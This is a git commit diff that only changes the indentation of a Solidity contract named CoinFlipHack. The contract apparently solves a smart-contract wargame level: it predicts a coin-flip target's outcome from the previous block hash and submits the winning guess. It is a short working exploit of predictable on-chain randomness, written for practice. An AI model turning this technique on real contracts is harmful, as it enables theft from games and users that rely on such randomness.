07d3b771e29420a212008b0a1c4321eaed9e56c0
Seungjin Park <aad336545@gmail.com>
2024-02-05 13:57:37 +0900

    fix tabspaces to 4

--- contracts/CoinFlipHack.sol
+++ contracts/CoinFlipHack.sol
@@ -4,25 +4,25 @@ pragma solidity ^0.8.0;
 import "./CoinFlip.sol";
 
 contract CoinFlipHack {
-  uint256 lastHash;
-  address target;
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 lastHash;
+    address target;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-  constructor(address _target) {
-    target = _target;
-  }
-
-  function flip() public {
-    uint256 blockValue = uint256(blockhash(block.number - 1));
-
-    if (lastHash == blockValue) {
-      revert();
+    constructor(address _target) {
+        target = _target;
     }
 
-    lastHash = blockValue;
-    uint256 coinFlip = blockValue / FACTOR;
-    bool guess = coinFlip == 1 ? true : false;
+    function flip() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
 
-    CoinFlip(target).flip(guess);
-  }
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+
+        CoinFlip(target).flip(guess);
+    }
 }
